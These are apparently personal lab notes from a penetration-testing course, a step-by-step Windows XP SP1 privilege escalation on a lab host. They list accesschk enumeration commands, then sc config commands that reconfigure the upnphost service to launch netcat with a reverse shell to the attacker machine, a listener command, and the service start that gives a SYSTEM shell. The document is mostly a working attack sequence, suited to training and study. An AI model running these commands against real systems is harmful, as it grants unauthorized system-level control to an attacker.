Privilege Escalation

1. Follow the method for exploiting Win XP SP1 from [fuzzysecurity](https://www.fuzzysecurity.com/tutorials/16.html) and [sohvaxus](https://sohvaxus.github.io/content/winxp-sp1-privesc.html). Specifically for this box, I used sohvaxus.

2. Download Accesschk.exe and eula from here.
`https://xor.cat/assets/other/Accesschk.zip`
On attack machine, these files are located at `/home/kali/gitWorkspace/pwk/outputFiles/active_gathering/10.11.1.14/privesc/accesschk`
![71527c50ecddeb52c93e350ed1c28c1f.png](../../../_resources/7026d217696f48679b480fe61c8ff594.png)

3. Transfer accesschk.exe and Eula.txt to the target via ftp. **Ensure you download in binary mode**
![b2c4d7c9cacafb42f5423a0c56b12399.png](../../../_resources/5d77e3a9d74e40b9ac21add728efeaed.png)

4. On the target, Go to the directory where it was loaded and then query vulnerable services we can exploit.
`accesschk.exe /accepteula -uwcqv "Authenticated Users" *`
![2d8a03f5ae7a6823b646d51c796d6cb6.png](../../../_resources/2ebe3da4cbcb4d2297c1c42c50437012.png)

5. View the SSDPSRV service
`accesschk.exe /accepteula -ucqv SSDPSRV`
![1a9f53a99SSDPSRV service
a6911e0f625fdf25215567.png](../../../_resources/3a0d730f372f45f9a7ed07d794a7958f.png)

6. View the upnup host
`accesschk.exe /accepteula -ucqv upnphost`
![6e9f8f4457ad849480fdb1cdb29bfd98.png](../../../_resources/a3f82febd59d4464a256bdbae9760931.png)

7. Check the parameters upnup. You'll see that it has a dependency on  SSDPSRV
`sc qc upnphost`
**Screenshot is missing**

8. Check the parameters for SSDPSRV. Notice that it is disabled.
`sc qc SSDPSRV`
![008771297bf4268db164aa1f0bd38c2c.png](../../../_resources/67d1c722b0d642bf81793b9281a2c815.png)

9. Query status for SSDPSRV
`sc query SSDPSRV`
![b093e2def6e743007d7013cdf051ad36.png](../../../_resources/21c7d15a1cd44c07b96149081857b2be.png)

10. Attempt to start the SSDPSRV service
`net start SSDPSRV`
![4f33eccea5646728efb11392ec7243f5.png](../../../_resources/221a9330b1714a73a71194b1d9559d18.png)

11. Set SSDPSRV to AUTOMATIC/ **Be sure to follow the syntax which shows that there is a single space between '=' and 'auto'**
`sc config SSDPSRV start= auto`
![89db5ef8c170df2bf00fcaaea5223ad0.png](../../../_resources/c4d5c0c3cdbc402bbd18a96019417ee2.png)

12. Double check that SSDPSRV is set to automatic
`sc qc SSDPSRV`
![ebb96f83a87129a25adcc4eaaf3b9907.png](../../../_resources/3abcc51507ed40dd834c6b41be5b3376.png)

13. Try again to start SSDPSRV
`net start SSDPSRV`
![9144f354bcb2b81042102df424f61de5.png](../../../_resources/764310a094384938894f44398ca7e70d.png)

14. Download netcat from here. I used the 1.12 version
`https://eternallybored.org/misc/netcat/`
On attack machine, it is located at: `/home/kali/gitWorkspace/pwk/outputFiles/active_gathering/10.11.1.14/privesc/netcat`
![f9271a36eb375d961d9bc3de332d29f3.png](../../../_resources/a3a324b1de0b4dd3a95b8e2bba972100.png)

15. Upload nc.exe to your target via FTP. **Ensure it is in binary mode**
![46f2c85b704eae726afdad8afff6a554.png](../../../_resources/38c4d3b6c83440e8bdc85cd1a49e151e.png)

16. Verify the path where nc.exe is located on the target. In this case: `C:\Inetpub\nc.exe`
![7dd83231d712b3567dcf7a68bb5661fe.png](../../../_resources/198938cd711045f68ad7895a4ea5ab3d.png)

17. Set a new binary path for netcat
`sc config upnphost binpath= "C:\Inetpub\nc.exe -nv 192.168.119.214 6789 -e C:\WINDOWS\System32\cmd.exe"`
![ca19c73880f110123e688784ccc414b9.png](../../../_resources/f57ba7209e86454ca0d1400364d24c79.png)

18. Set object and password
`sc config upnphost obj= ".\LocalSystem" password= ""`
![9ce6aa2d0b513b72ba85dde6bb265263.png](../../../_resources/142cd89be25a4cacae5d77660353c44c.png)

19. Set a netcat listener on attack machine
`sudo nc -lvnp 6789`
![f0de3b4e82698588e2224b05e44d5ce5.png](../../../_resources/a767ebec0c3d46daa1e3ec1005d55009.png)

20. Check again that everything is fine
`sc qc upnphost`
![fc678f3f4d9a7efd4b0337ad200aae73.png](../../../_resources/4676556a25e74095ae58b79eecd9d480.png)

21. Run upnphost, you'll see that you have system on the netcat listener port 6789. You'll have 30 seconds to get the proof.txt
`net start upnphost`
![f779a950a57533c9206a323a171f6937.png](../../../_resources/80e8faae4608439da038bf4b80724b8e.png)

22. To get a shell lasting more than 30 min, follow this. **This is still a TO-DO on this box!!**
![IMG_1859.PNG](../../../_resources/cf91c7e9e3e64c2b856ecb90d0072624.PNG)


